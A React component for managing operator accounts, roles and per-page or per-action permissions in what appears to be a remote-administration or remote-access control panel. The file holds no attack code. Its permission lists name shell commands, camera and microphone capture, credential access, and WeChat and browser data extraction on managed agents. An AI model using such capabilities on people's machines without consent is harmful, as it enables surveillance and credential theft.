import { useState, useEffect, useCallback } from 'react';
import { useTranslation } from 'react-i18next';
import { Button, Card, Chip, Input, Label, Modal, Spinner, Switch, TextField } from '@heroui/react';
import { getAccountStatus, listAccounts, createAccount, updateAccount, deleteAccount, changePassword } from '../../api/account';
import { getStoredUser } from '../../api/auth';
import type { AccountListItem, UserPermissions } from '../../types/models';
import { useDialog } from '../../hooks/useDialog';

const PAGE_OPTIONS: { key: string; labelKey: string }[] = [
  { key: 'dashboard', labelKey: 'nav.dashboard' },
  { key: 'agents', labelKey: 'nav.agents' },
  { key: 'shell', labelKey: 'nav.shell' },
  { key: 'files', labelKey: 'nav.explorer' },
  { key: 'screen', labelKey: 'nav.screen' },
  { key: 'media', labelKey: 'nav.media' },
  { key: 'system', labelKey: 'nav.system' },
  { key: 'othersoft', labelKey: 'nav.softwareData' },
  { key: 'proxy', labelKey: 'nav.proxyBrowser' },
  { key: 'builder', labelKey: 'nav.builder' },
  { key: 'audit', labelKey: 'nav.auditLogs' },
  { key: 'plugins', labelKey: 'nav.plugins' },
];

const ACTION_OPTIONS = [
  'shell.command', 'file.list', 'file.read', 'file.write', 'file.delete',
  'file.mkdir', 'file.rename', 'file.move', 'file.copy', 'file.compress', 'file.decompress',
  'screen.monitor', 'media.camera', 'media.mic',
  'system.info', 'system.processes', 'system.process.kill', 'system.network',
  'othersoft.wechat', 'othersoft.browser', 'othersoft.ai', 'credentials',
  'proxy.fetch',
];

export default function AccountTab() {
  const { t } = useTranslation();
  const { confirm, DialogComponent } = useDialog();
  const [isInitial, setIsInitial] = useState(false);
  const [accounts, setAccounts] = useState<AccountListItem[]>([]);
  const [loading, setLoading] = useState(true);

  // Create / edit modal
  const [modalOpen, setModalOpen] = useState(false);
  const [editingAccount, setEditingAccount] = useState<AccountListItem | null>(null);
  const [formName, setFormName] = useState('');
  const [formPassword, setFormPassword] = useState('');
  const [formRole, setFormRole] = useState('Operator');
  const [formFullAccess, setFormFullAccess] = useState(true);
  const [formPages, setFormPages] = useState<string[]>([]);
  const [formActions, setFormActions] = useState<string[]>([]);
  const [saving, setSaving] = useState(false);
  const [formError, setFormError] = useState<string | null>(null);

  // Change password modal
  const [pwModalOpen, setPwModalOpen] = useState(false);
  const [currentPw, setCurrentPw] = useState('');
  const [newPw, setNewPw] = useState('');
  const [pwSaving, setPwSaving] = useState(false);
  const [pwError, setPwError] = useState<string | null>(null);

  const loadData = useCallback(async () => {
    try {
      const [status, list] = await Promise.all([
        getAccountStatus(),
        listAccounts(),
      ]);
      setIsInitial(status.isInitial);
      setAccounts(Array.isArray(list) ? list : []);
    } catch { /* ignore */ }
    finally { setLoading(false); }
  }, []);

  useEffect(() => { loadData(); }, [loadData]);

  const openCreateModal = () => {
    setEditingAccount(null);
    setFormName('');
    setFormPassword('');
    setFormRole('Operator');
    setFormFullAccess(true);
    setFormPages([]);
    setFormActions([]);
    setFormError(null);
    setModalOpen(true);
  };

  const openEditModal = (acc: AccountListItem) => {
    setEditingAccount(acc);
    setFormName(acc.username);
    setFormPassword('');
    setFormRole(acc.role);
    setFormFullAccess(acc.permissions?.fullAccess ?? true);
    setFormPages(acc.permissions?.allowedPages ?? []);
    setFormActions(acc.permissions?.allowedActions ?? []);
    setFormError(null);
    setModalOpen(true);
  };

  const buildPermissions = (): UserPermissions => ({
    fullAccess: formFullAccess,
    allowedPages: formPages,
    allowedActions: formActions,
  });

  const handleSave = async () => {
    if (!formName.trim()) { setFormError(t('settings.account.nameRequired')); return; }
    if (!editingAccount && !formPassword) { setFormError(t('settings.account.passwordRequired')); return; }
    if (!editingAccount && formPassword.length < 6) { setFormError(t('settings.account.passwordMinLength')); return; }
    setFormError(null);
    setSaving(true);
    try {
      if (editingAccount) {
        await updateAccount(editingAccount.id, {
          username: formName.trim(),
          role: formRole,
          permissions: buildPermissions(),
        });
      } else {
        await createAccount({
          username: formName.trim(),
          password: formPassword,
          role: formRole,
          permissions: buildPermissions(),
        });
      }
      setModalOpen(false);
      await loadAccounts();
    } catch (err: unknown) {
      setFormError(err instanceof Error ? err.message : String(err));
    } finally { setSaving(false); }
  };

  const handleDelete = async (acc: AccountListItem) => {
    const result = await confirm(t('settings.account.deleteConfirm', { name: acc.username }));
    if (!result.confirmed) return;
    try {
      await deleteAccount(acc.id);
      await loadAccounts();
    } catch (err: unknown) {
      // Show error? For now silently fail
    }
  };

  const handleChangePassword = async () => {
    if (!currentPw) { setPwError(t('settings.account.currentPasswordRequired')); return; }
    if (newPw.length < 6) { setPwError(t('settings.account.passwordMinLength')); return; }
    setPwError(null);
    setPwSaving(true);
    try {
      await changePassword({ currentPassword: currentPw, newPassword: newPw });
      setPwModalOpen(false);
      setCurrentPw('');
      setNewPw('');
    } catch (err: unknown) {
      setPwError(err instanceof Error ? err.message : String(err));
    } finally { setPwSaving(false); }
  };

  async function loadAccounts() {
    try {
      const list = await listAccounts();
      setAccounts(Array.isArray(list) ? list : []);
    } catch { /* ignore */ }
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <Spinner size="lg" />
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Account Management Card — Admin only */}
      <Card className="p-6">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-lg font-semibold">{t('settings.account.accounts')}</h2>
          <Button variant="primary" size="sm" onPress={openCreateModal}>
            {t('settings.account.createAccount')}
          </Button>
        </div>
        <div className="space-y-3">
          {accounts.map((a) => {
            const isRestricted = !(a.permissions?.fullAccess ?? true);
            const isSelf = a.username === (getStoredUser()?.username ?? '');
            return (
              <Card key={a.id} className="p-4">
                <div className="flex items-center justify-between gap-4">
                  <div className="flex items-center gap-3 min-w-0">
                    <div className="w-10 h-10 shrink-0 rounded-full bg-primary-100 text-primary-700 flex items-center justify-center font-semibold">
                      {a.username.slice(0, 1).toUpperCase()}
                    </div>
                    <div className="min-w-0">
                      <div className="flex items-center gap-2">
                        <span className="font-medium truncate">{a.username}</span>
                        {a.isInitial && (
                          <Chip size="sm" variant="soft" color="accent">{t('settings.account.initialBadge')}</Chip>
                        )}
                      </div>
                      <div className="text-xs text-default-500 mt-0.5 truncate">
                        {t('settings.account.createdAt')} {new Date(a.createdAt).toLocaleDateString()}
                        {a.lastLogin ? ` · ${t('settings.account.lastLogin')} ${new Date(a.lastLogin).toLocaleDateString()}` : ''}
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-2 shrink-0">
                    <Chip size="sm" variant="soft" color={a.role === 'Admin' ? 'accent' : 'default'}>
                      {a.role === 'Admin' ? t('settings.account.roleAdmin') : t('settings.account.roleOperator')}
                    </Chip>
                    <Chip size="sm" variant="soft" color={a.isActive ? 'success' : 'danger'}>
                      {a.isActive ? t('settings.account.active') : t('settings.account.inactive')}
                    </Chip>
                    {isRestricted && (
                      <Chip size="sm" variant="soft" color="warning">
                        {t('settings.account.restricted')}
                      </Chip>
                    )}
                    {isSelf ? (
                      <Button size="sm" variant="ghost" onPress={() => setPwModalOpen(true)}>
                        {t('settings.account.changePassword')}
                      </Button>
                    ) : !a.isInitial && (
                      <div className="flex gap-1 ml-1">
                        <Button size="sm" variant="ghost" onPress={() => openEditModal(a)}>
                          {t('settings.edit')}
                        </Button>
                        <Button size="sm" variant="danger" onPress={() => handleDelete(a)}>
                          {t('settings.delete')}
                        </Button>
                      </div>
                    )}
                  </div>
                </div>
              </Card>
            );
          })}
          {accounts.length === 0 && (
            <div className="py-10 text-center text-default-400 text-sm">{t('settings.account.noAccounts')}</div>
          )}
        </div>
      </Card>

      {/* Create/Edit Modal */}
      <Modal.Backdrop isOpen={modalOpen} onOpenChange={(open) => { if (!open) setModalOpen(false); }}>
        <Modal.Container size="sm">
          <Modal.Dialog>
            <Modal.CloseTrigger />
            <Modal.Header>
              <Modal.Heading>
                {editingAccount ? t('settings.account.editAccount') : t('settings.account.createAccount')}
              </Modal.Heading>
            </Modal.Header>
            <Modal.Body>
              <div className="space-y-4">
                {formError && (
                  <div className="p-2 bg-danger-50 text-danger-700 rounded text-xs">{formError}</div>
                )}
                <TextField variant="secondary" value={formName} onChange={setFormName}>
                  <Label>{t('settings.account.username')}</Label>
                  <Input variant="secondary" autoFocus />
                </TextField>
                {!editingAccount && (
                  <TextField variant="secondary" value={formPassword} onChange={setFormPassword}>
                    <Label>{t('settings.account.password')}</Label>
                    <Input variant="secondary" type="password" />
                  </TextField>
                )}
                <div className="space-y-2">
                  <Label>{t('settings.account.role')}</Label>
                  <div className="flex gap-2">
                    <Button
                      variant={formRole === 'Operator' ? 'primary' : 'ghost'}
                      size="sm"
                      onPress={() => setFormRole('Operator')}
                    >
                      {t('settings.account.roleOperator')}
                    </Button>
                    <Button
                      variant={formRole === 'Admin' ? 'primary' : 'ghost'}
                      size="sm"
                      onPress={() => setFormRole('Admin')}
                    >
                      {t('settings.account.roleAdmin')}
                    </Button>
                  </div>
                </div>

                <div className="space-y-3 border-t border-default-200 pt-3">
                  <Switch isSelected={formFullAccess} onChange={setFormFullAccess}>
                    <Switch.Control><Switch.Thumb /></Switch.Control>
                    <Switch.Content>
                      <Label className="text-sm">{t('settings.account.fullAccess')}</Label>
                    </Switch.Content>
                  </Switch>

                  {!formFullAccess && (
                    <div className="space-y-4">
                      <div>
                        <Label className="text-xs text-default-500">{t('settings.account.allowedPages')}</Label>
                        <div className="grid grid-cols-2 gap-1 mt-1">
                          {PAGE_OPTIONS.map((p) => (
                            <label key={p.key} className="flex items-center gap-2 text-sm cursor-pointer">
                              <Input variant="secondary"
                                type="checkbox"
                                checked={formPages.includes(p.key)}
                                onChange={(e) => setFormPages((prev) => e.target.checked ? [...prev, p.key] : prev.filter((x) => x !== p.key))}
                              />
                              {t(p.labelKey)}
                            </label>
                          ))}
                        </div>
                      </div>
                      <div>
                        <Label className="text-xs text-default-500">{t('settings.account.allowedActions')}</Label>
                        <div className="grid grid-cols-2 gap-1 mt-1">
                          {ACTION_OPTIONS.map((a) => (
                            <label key={a} className="flex items-center gap-2 text-sm cursor-pointer">
                              <Input variant="secondary"
                                type="checkbox"
                                checked={formActions.includes(a)}
                                onChange={(e) => setFormActions((prev) => e.target.checked ? [...prev, a] : prev.filter((x) => x !== a))}
                              />
                              {t(`riskPolicy.labels.${a}`)}
                            </label>
                          ))}
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </Modal.Body>
            <Modal.Footer>
              <Button variant="ghost" onPress={() => setModalOpen(false)}>
                {t('common.cancel')}
              </Button>
              <Button variant="primary" isPending={saving} onPress={handleSave}>
                {t('settings.create')}
              </Button>
            </Modal.Footer>
          </Modal.Dialog>
        </Modal.Container>
      </Modal.Backdrop>

      {/* Change Password Modal */}
      <Modal.Backdrop isOpen={pwModalOpen} onOpenChange={(open) => { if (!open) { setPwModalOpen(false); setPwError(null); } }}>
        <Modal.Container size="sm">
          <Modal.Dialog>
            <Modal.CloseTrigger />
            <Modal.Header>
              <Modal.Heading>{t('settings.account.changePassword')}</Modal.Heading>
            </Modal.Header>
            <Modal.Body>
              <div className="space-y-4">
                {pwError && (
                  <div className="p-2 bg-danger-50 text-danger-700 rounded text-xs">{pwError}</div>
                )}
                <TextField variant="secondary" value={currentPw} onChange={setCurrentPw}>
                  <Label>{t('settings.account.currentPassword')}</Label>
                  <Input variant="secondary" type="password" autoFocus />
                </TextField>
                <TextField variant="secondary" value={newPw} onChange={setNewPw}>
                  <Label>{t('settings.account.newPassword')}</Label>
                  <Input variant="secondary" type="password" />
                </TextField>
              </div>
            </Modal.Body>
            <Modal.Footer>
              <Button variant="ghost" onPress={() => { setPwModalOpen(false); setPwError(null); }}>
                {t('common.cancel')}
              </Button>
              <Button variant="primary" isPending={pwSaving} onPress={handleChangePassword}>
                {t('settings.account.changePassword')}
              </Button>
            </Modal.Footer>
          </Modal.Dialog>
        </Modal.Container>
      </Modal.Backdrop>

      {DialogComponent}
    </div>
  );
}
